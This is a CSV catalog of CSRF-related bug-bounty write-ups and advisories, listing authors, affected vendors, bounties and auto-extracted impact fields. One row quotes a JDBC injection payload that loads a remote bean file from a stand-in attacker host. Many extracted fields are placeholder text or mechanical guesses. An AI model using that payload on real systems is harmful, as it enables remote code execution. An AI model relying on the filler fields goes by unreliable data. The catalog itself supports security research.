Title,URL,Authors,Programs,Bugs,Bounty,PublicationDate,AddedDate,functionality,request_method,anti_csrf_bypass,impact,impact_severity,attack_vector,technical_details,comments
CSRFing VS Code's Debug Adapter Protocol,https://www.mcnulty.blog/posts/dap-csrf,Dan McNulty (@_Z7mcnulty),Microsoft (VS Code),"CSRF, RCE",-,2023-07-28,2023-08-08,account management,POST,json-based csrf,account takeover,critical,api endpoint,"ExploitOverviewFinding Local DAP PortsPort Binding BehaviorDebugger for Java ExploitmacosWindowsFixing the Vulnerabilityjava-debugcppdapThanks!Future WorkAppendix: False StartsCSRFing VS Code's Debug Adapter ProtocolJuly 28, 2023SummaryLocal debug adapter TCP servers, deployed as part of a Debug Ada","that Google and others are actively working on a standard called Private Network Access to enhance browsers to use extensions to CORS to require locally running servers to opt-in to access from pages served from the public Internet.ImpactIn theory, any DAP debug adapter that uses the type-C deployme"
Multiple vulnerabilities on Chamilo 1.11.18,https://www.randorisec.fr/chamilo-1.11.18-multiple-vulnerabilities,Aituglo (@aituglo),Chamilo,"OS command injection, RCE, SSRF, IDOR, XSS, CSRF, Security code review",-,2023-07-01,2023-07-17,unknown,unknown,unknown,unknown,unknown,unknown,could not extract,could not extract
Multiple Vulnerabilities In Cockpit CMS <= V2.5.2,https://www.ghostccamm.com/blog/multi_cockpit_vulns/,GhostCcamm (@GhostCcamm),Cockpit CMS,"CSRF, Unrestricted file upload, RCE, XSS, IDOR, Security code review",-,2023-06-30,2023-07-12,account management,POST,token validation bypass,account takeover,critical,api endpoint,if you are using the Cockpit CMS api since the Content API validates the role's permissions first.,Vulnerabilities Disclosure Timeline
"My first two valid and rewarded Web Cache Deceptions, earning $2250",https://medium.com/@hbenja47/my-first-two-valid-and-rewarded-web-cache-deceptions-earning-2250-c8d2a6968713,Benja (bronxi) (@hbenja_m),-,"Web cache deception, CSRF","2,250",2023-06-25,2023-06-27,account management,POST,no token,account takeover,critical,form-based attack,standard csrf exploitation,State-changing action vulnerable to CSRF
"A smorgasbord of a bug chain: postMessage, JSONP, WAF bypass, DOM-based XSS, CORS, CSRF…",https://jub0bs.com/posts/2023-05-05-smorgasbord-of-a-bug-chain/,Julien Cretel (@jub0bs),-,"postMessage, JSONP, DOM XSS, CORS misconfiguration, CSRF, WAF bypass",200,2023-05-05,2023-05-06,account management,POST,samesite cookie bypass,unauthorized actions,critical,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
Simple Bugs 0x01: Password Changing to Account Takeover!,https://vitorfalcao.com/posts/simple-bugs/password-changing-to-ato/,Vitor Falcao (@egl_falcao),-,"Account takeover, CSRF",-,2023-04-03,2023-04-06,unknown,unknown,unknown,unknown,unknown,unknown,could not extract,could not extract
Unveiling the Secrets: My Journey of Hacking Google’s OSS,https://7h3h4ckv157.medium.com/unveiling-the-secrets-my-journey-of-hacking-googles-oss-cdd9ef3c7aa,7𝖍3𝖍4𝖈kv157 (@7h3h4ckv157),Google,"CSRF, Self-XSS",-,2023-03-31,2023-03-31,content management,POST,samesite cookie bypass,account takeover,critical,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
Bypassing SameSite=lax cookie restrictions to preform CSRF resulting to a horizontal privilege escalation via poor email verification mechanism,https://medium.com/@deadoverflow/bypassing-samesite-lax-cookie-restrictions-to-preform-csrf-resulting-to-a-horizontal-privilege-1dfc8fb17b0a,Imad Husanovic (@deadoverflow_),-,CSRF,-,2023-02-13,2023-02-22,account management,POST,samesite cookie bypass,privilege escalation,high,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
Chaining Bugs to get my First Bug Bounty,https://infosecwriteups.com/chaining-bugs-to-get-my-first-bug-bounty-7e94afb704e7,ag3n7 (@ag3n7apk),-,"CSRF, Open redirect, Clickjacking, Account takeover",-,2023-02-08,2023-03-02,account management,POST,no token,account takeover,critical,api endpoint,standard csrf exploitation,"of the attack was that we redirected to the clickjacking vulnerable login page via openredirection and then the user enters their username and password, it directly passed to the password reset form using javascript which successfully changes the password of the victim to the attacker’s password.fak"
SSO Gadgets: Escalate (Self-)XSS to ATO,https://security.lauritz-holtmann.de/post/xss-ato-gadgets/,Lauritz Holtmann (@_lauritz_),-,"SSO, OAuth, Account takeover, Self-XSS, Login CSRF",-,2023-02-04,2023-02-07,account management,POST,samesite cookie bypass,account takeover,critical,api endpoint,standard csrf exploitation,"of erroneous SSO configurations and the importance of properly implementing OAuth/OIDC. Further, I hope that this post will help developers to better understand the potential of allegedly “harmless” vulnerabilities such as Self-XSS and Login CSRF in the context of SSO implementations.Thank you for r"
CSRF + Stored XSS Leading to Full Account Takeover,https://medium.com/@bag0zathev2/csrf-stored-xss-to-leading-to-full-account-takeover-39e9a79533e3,Fares Walid (@SirBagoza),-,"Stored XSS, CSRF, Account takeover",-,2023-01-20,2023-01-23,unknown,unknown,unknown,unknown,unknown,unknown,could not extract,could not extract
EmojiDeploy: Smile! Your Azure web service just got RCE’d ._.,https://ermetic.com/blog/azure/emojideploy-smile-your-azure-web-service-just-got-rced/,Liv Matan (@terminatorLM),Microsoft (Azure),"RCE, Cloud, CSRF, CORS misconfiguration","30,000",2023-01-19,2023-01-23,account management,POST,referer validation bypass,account takeover,critical,api endpoint,of SCM capabilities.Responsible disclosureWe want to thank Microsoft for its cooperation and swift response. MSRC conducted a deep investigation while fixing the vulnerability as rapidly as possible.Microsoft recognized EmojiDeploy as an RCE (Remote Code Execution) vulnerability and awarded a bounty,of the vulnerability on the organization as a whole depends on the permissions of the applications managed identity. Effectively applying the principle of least privilege can significantly limit the blast radius.EmojiDeploy exploit componentsThe full attack exploits multiple misconfigurations and by
Client-Side SSRF to Google Cloud Project Takeover [Google VRP],https://blog.geekycat.in/client-side-ssrf-to-google-cloud-project-takeover/,Dohyun Lee,Google,"SSRF, CSRF, Open redirect","5,000",2023-01-12,2023-01-18,unknown,unknown,unknown,unknown,unknown,unknown,could not extract,could not extract
“2022: A Year of Fascinating Discoveries”,https://dhakalbibek.medium.com/2022-a-year-of-fascinating-discoveries-d3277dfb006f,dhakal_bibek (@dhakal__bibek),-,"CSRF, SSRF, Blind XSS, Password reset, Hyperlink injection, IDOR, Weak credentials, AWS misconfiguration",-,2023-01-09,2023-01-11,account management,POST,samesite cookie bypass,account takeover,critical,api endpoint,standard csrf exploitation,"and some of them are even funny:Some of my findings of 2022:Referrer based CSRF protection bypass:Blind XSS in the Super admin panel of xyz, bypassing the one-time name limitationPassword reset link poisoningIDOR vulnerability, which allows an attacker to find out the information of private videos o"
Advanced CSRF Exploitation,https://medium.com/@sandro.einfeldt/advanced-csrf-exploitation-via-xss-4cd00c895ba,Sandro Einfeldt,-,"CSRF, Stored XSS",-,2023-01-07,2023-01-11,unknown,unknown,unknown,unknown,unknown,unknown,could not extract,could not extract
[ GCP 2022 ] Few bugs in the google cloud shell,https://obmiblog.blogspot.com/2022/12/gcp-2022-few-bugs-in-google-cloud-shell.html,Obmi,Google,"CSRF, Stored XSS, File upload, OAuth","20,000",2022-12-26,2023-07-12,account management,POST,token exposed in url,account takeover,critical,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
Exploiting CORS Misconfigurations,https://attackshipsonfi.re/p/exploiting-cors-misconfigurations,scarlet / attack ships on fire,"Apple, Google, Mozilla (Firefox), WHATWG","CORS misconfiguration, CSRF, XST",-,2022-11-26,2022-11-26,account management,POST,samesite cookie bypass,unauthorized actions,low,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
Able to Mass-change profile section leads to my first $BOUNTY$,https://hacklido.com/d/93-able-to-mass-change-profile-section-leads-to-my-first-bounty,SYRINE,-,"HTML injection, IDOR, CSRF","1,000",2022-11-25,2022-12-12,unknown,POST,no token,unauthorized actions,medium,web application,standard csrf exploitation,State-changing action vulnerable to CSRF
Contrast discovers zero-day flaw in popular Quarkus Java framework,https://www.contrastsecurity.com/security-influencers/localhost-attack-against-quarkus-developers-contrast-security,Joseph Beeton,Quarkus,"Drive-by attack, CSRF, RCE",-,2022-11-23,2022-12-12,account management,POST,referer validation bypass,account takeover,critical,api endpoint,(POC):  Index.html,"services running in production; it only impacts developers building services using Quarkus. If a developer running Quarkus locally visits a website with malicious JavaScript, that JavaScript can silently execute code on the developer’s machine.  The payload I created — see here and here on GitHub — "
CVE-2021-40662 Chamilo LMS 1.11.14 RCE,https://hacklido.com/d/90-cve-2021-40662-chamilo-lms-11114-rce,Febin,Chamilo LMS,"Stored XSS, CSRF, RCE",-,2021-11-23,2022-12-12,account management,POST,no token,account takeover,critical,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
CVE-2022-41622 and CVE-2022-41800 (FIXED): F5 BIG-IP and iControl REST Vulnerabilities and Exposures,https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/,Ron Bowes (@iagox86),F5,"CSRF, RCE, RPM Spec Injection",-,2022-11-16,2022-11-17,account management,POST,samesite cookie bypass,account takeover,critical,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
Compromising Plesk Via Its REST API,https://fortbridge.co.uk/research/compromising-plesk-via-its-rest-api/,Adrian Tiron (@Adrian__T),Plesk,"CORS misconfiguration, CSRF",-,2022-11-08,2022-11-11,unknown,unknown,unknown,unknown,unknown,unknown,could not extract,could not extract
CSRF Leads to Delete User Account,https://medium.com/@omarbakrey90/csrf-leads-to-delete-user-account-fc362078be2f,Omarbakrey,-,CSRF,-,2022-11-04,2022-11-05,account management,POST,no token,account takeover,medium,web application,standard csrf exploitation,State-changing action vulnerable to CSRF
Chaining multiple vulnerabilities for credential stealing,https://web.archive.org/web/20221025185418/https://bergee.it/blog/chaining-multiple-vulnerabilities-for-credential-stealing/,Bartłomiej Bergier (@_bergee_),-,"CSRF, Self-XSS, XSS",-,2022-10-25,2022-10-28,account management,POST,samesite cookie bypass,account takeover,critical,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
Facebook SMS Captcha Was Vulnerable to CSRF Attack,https://lokeshdlk77.medium.com/facebook-sms-captcha-was-vulnerable-to-csrf-attack-8db537b1e980,Lokesh Kumar (@lokeshdlk77),Meta / Facebook,CSRF,"18,750",2022-10-17,2022-10-17,account management,POST,no token,unauthorized actions,high,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
"Mr. Robot: Self Xss from Informative to high 1200$ ,csrf, open redirect,self xss to stored",https://ahmadaabdulla.medium.com/mr-robot-self-xss-from-informative-to-high-1200-csrf-open-redirect-self-xss-to-stored-92f371ba3da1,Ahmad A Abdulla (@lu3ky13),-,"Self-XSS, CSRF","1,200",2022-10-06,2022-10-08,account management,POST,no token,unauthorized actions,high,form-based attack,standard csrf exploitation,and not accepted by the website it’s too boredafter 2 or 3 hours I found a demo panel with the same information when you change the first name will change in the demo i changed to xss payload first name and the last name will be done and worked xss but the website not accepting self xss we need to c
CSRF Attack — 0 click account delete - 1st write-up,https://medium.com/@bug_vs_me/csrf-attack-0-click-account-delete-1st-write-up-3d67b267b931,Deepak (@bug_vs_me),-,"CSRF, HTML injection",-,2022-10-03,2022-10-04,account management,POST,no token,unauthorized actions,medium,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
Zoneminder – Web App Testing – Oct 2022,https://www.trenchesofit.com/2022/09/30/zoneminder-web-app-testing/,Trenches of IT (@TrenchesofIT),ZoneMinder,"DoS, Log injection, CSRF, Stored XSS",-,2022-09-30,2022-10-07,unknown,unknown,unknown,unknown,unknown,unknown,could not extract,could not extract
Apollo Router Security Audit Report (Q2 2022),https://doyensec.com/resources/Doyensec_Apollo_Report_Q22022_v4_AfterRetest.pdf,"Norbert Szetei (@73696e65), Mykhailo Baraniak",Apollo GraphQL,"DoS, CSRF",-,2022-09-20,2022-09-22,account management,POST,no token,account takeover,critical,form-based attack,standard csrf exploitation,State-changing action vulnerable to CSRF
Bug Bounty - Cross-site request forgery is a thing,https://hesec.de/posts/bbh-csrf/,Patrick Hener (@C1sc01),-,"CSRF, XSS","2,400",2022-09-12,2022-11-30,account management,POST,referer validation bypass,account takeover,critical,form-based attack,where the victim will release a sequence of requests when visiting a malicious site. The actions are:,depends on which role the victim is authenticated with. In the case of my finding the CSRF-attack was targeted against an administrative account with severe functionality as I will show below. In regards of phishing attacks let me tell you this; phising attacks are successful every time. There is no
CSRF Vulnerability In The NodeJS Ecosystem,https://fortbridge.co.uk/research/csrf-vulnerability-in-nodejs-ecosystem/,Adrian Tiron (@adrian__t),Node.js third-party modules (csurf),CSRF,-,2022-08-28,2022-09-15,unknown,unknown,unknown,unknown,unknown,unknown,could not extract,could not extract
CSRF leads to Account Takeover | Samsung,https://bloggerrando.blogspot.com/2022/08/17-1.html,R ando (@Rando02355205),Samsung,"CSRF, Account takeover",-,2022-08-16,2022-09-15,unknown,unknown,unknown,unknown,unknown,unknown,could not extract,could not extract
IAM Whoever I Say IAM :: Infiltrating VMWare Workspace ONE Access Using a 0-Click Exploit,https://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html,Steven Seeley (@steventseeley),VMware,"Authentication bypass, Information disclosure, CSRF, RCE, Local Privilege Escalation",-,2022-08-11,2022-09-15,account management,POST,samesite cookie bypass,account takeover,critical,api endpoint,jdbc:postgresql://si/saas?&socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://attacker.tld:9090/bean.xml.,"The limitations of CVE-2020-4006 was that it required authentication and it was targeting port 8443. In comparison, this attack chain targets port 443 which is much more likely exposed externally. Additionally, no authentication was required all whilst achieving root access making it quite disastrou"
My Experience on Hacking the Dutch Government,https://gonzx.medium.com/my-experience-on-hacking-the-dutch-government-a2c5a5f43d83,Jefferson Gonzales (@gonzxph),Dutch Government,"XSS, Open redirect, CSRF, Account takeover",-,2022-08-11,2022-09-15,account management,POST,no token,account takeover,critical,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
How a Simple IDOR Led Me to Delete Any Account,https://payatu.com/blog/rajesh.r/idor-to-account-deletion,rajesh.r (@_rajesh_ranjan_),-,"IDOR, CSRF",-,2022-07-12,2022-09-15,unknown,unknown,unknown,unknown,unknown,unknown,could not extract,could not extract
How we have pwned Root-Me in 2022,https://spawnzii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/,"Romain Brun (@SpawnZii), Abyss Watcher",SPIP,"XSS, CSRF, RCE",-,2022-07-12,2022-09-15,account management,POST,json-based csrf,account takeover,critical,form-based attack,standard csrf exploitation,& Thanks It was a great experience to share our research with Abyss Watcher. We are happy to have contributed to the security of SPIP and Root-Me. Many thanks to Laluka and W0rty for proofreading this article.
We Hacked Larksuite For 1 month and Here is what we found,https://web.archive.org/web/20220716152713/https://snapsec.co/blog/hacking-larksuite/,Snap Sec (@snap_sec),Lark Technologies,"XSS, IDOR, Privilege escalation, Broken Access Control, CSRF, 40x bypass",-,2022-07-04,2022-09-15,account management,POST,samesite cookie bypass,account takeover,critical,api endpoint,standard csrf exploitation,"of the user account since there are very limited endpoints and functionalities hosted under open.larksuite.com, One of the features that caught our attention was the Application. In larksuite while creating an app, an admin can provide a set of Permission to the App which would allow the app to have"
CSRF leads to account takeover in Yahoo!,https://webs3c.com/t/csrf-leads-to-account-takeover-in-yahoo/93,Retr02332 (@Retr02332),Yahoo! / Verizon Media,"CSRF, Account takeover","3,000",2022-06-16,2022-09-15,account management,POST,samesite cookie bypass,account takeover,critical,api endpoint,standard csrf exploitation,State-changing action vulnerable to CSRF
If It’s a Feature!!! Let’s Abuse It for $750,https://medium.com/@shakti.gtp/if-its-a-feature-let-s-abuse-it-for-750-19cfb9848d4b,Shakti Mohanty (@3ncryptSaan),-,CSRF,750,2022-06-05,2022-09-15,account management,POST,no token,privilege escalation,high,api endpoint,standard csrf exploitation,"here. Don’t rely too much on the low hanging fruits , this will lead you to temporary happiness with a permanent burnout.”LET’s StartCause I Love PetOn the start of the last month, i picked a private program to hack on. The app was all about managing meetings, events , invoices etc. After few report"
Stealing Google Drive OAuth tokens from Dropbox,https://blog.stazot.com/stealing-google-drive-oauth-tokens-from-dropbox/,"Sivanesh Ashok (@sivaneshashok), Sreeram KL (@kl_sree)",Dropbox,"CSRF, SSRF, Account takeover","1,728",2022-05-17,2022-09-15,unknown,POST,no token,unauthorized actions,medium,web application,standard csrf exploitation,State-changing action vulnerable to CSRF
Multiple bugs chained to takeover Facebook Accounts which uses Gmail.,https://ysamm.com/?p=763,Youssef Sammouda (@samm0uda),Meta / Facebook,"XSS, CSRF, Account takeover","44,625",2022-05-14,2022-09-15,unknown,unknown,unknown,unknown,unknown,unknown,could not extract,could not extract
"The Underrated Bugs, Clickjacking, CSS Injection, Drag-Drop XSS, Cookie Bomb, Login+Logout CSRF…",https://medium.com/@renwa/the-underrated-bugs-clickjacking-css-injection-drag-drop-xss-cookie-bomb-login-logout-csrf-84307a98fffa,Renwa (@RenwaX23),-,"CSS injection, Clickjacking, Account takeover, XSS, Cookie bomb, Self-XSS, CSRF","3,850",2022-05-10,2022-09-15,account management,POST,no token,account takeover,critical,api endpoint,standard csrf exploitation,"we can do so I went to look for how we can leverage this to higher severity, The application is app2.com and the login flow is using OAuth from app2-parent.com it’s a simple process, app2.com will redirect to app2-parent.com/oauth/authorize?client_id=aa...&redirect_uri=https://app2.com/auth&response"
Chained Bug: XML File Upload to XSS to CSRF to Full Account Take Over (ATO),https://systemweakness.com/chained-bug-xml-file-upload-to-xss-to-csrf-to-full-account-take-over-ato-156409c41b57,Zulfi Al-Farizi,-,"XSS, CSRF, Account takeover",-,2022-05-06,2022-09-15,account management,POST,no token,account takeover,critical,api endpoint,standard csrf exploitation,so I look deeper on the website and I got another sensitive token leak when using the invite a friend feature and in ViewCart url.the url looks like https://www.example.com/ViewCart.asp?mid=7BA2xxxxxxx and the merchantId is leaked on image link of the cart (picture product)If another user opens the 
